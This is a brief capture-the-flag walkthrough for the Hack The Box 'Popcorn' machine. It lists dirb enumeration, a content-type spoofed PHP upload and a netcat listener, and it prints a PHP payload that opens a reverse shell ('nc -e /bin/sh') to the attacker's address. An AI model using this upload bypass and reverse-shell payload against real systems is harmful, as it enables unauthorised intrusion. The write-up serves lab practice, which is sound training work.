# popcorn-hackthebox

### Discover

`dirb http://10.10.10.6 /usr/share/wordlists/dirb/big.txt` 

### Shell

Instantiate a shell on your Kali:

```sh
nc -l -p 4444
```

Upload a `test.png.php` file, intercepting with Burpsuite and changing the `Content-Type` to `image/png`, containing:

```php
<?php echo system('nc -e /bin/sh {KALI_IP_ADDRESS} 4444');
```

Now find the image in the HTML page and use to connect to your shell.

Flag can be found in `/home/george`.

### Root

Once you're in, copy the `pam.sh` script, and execute to gain root.

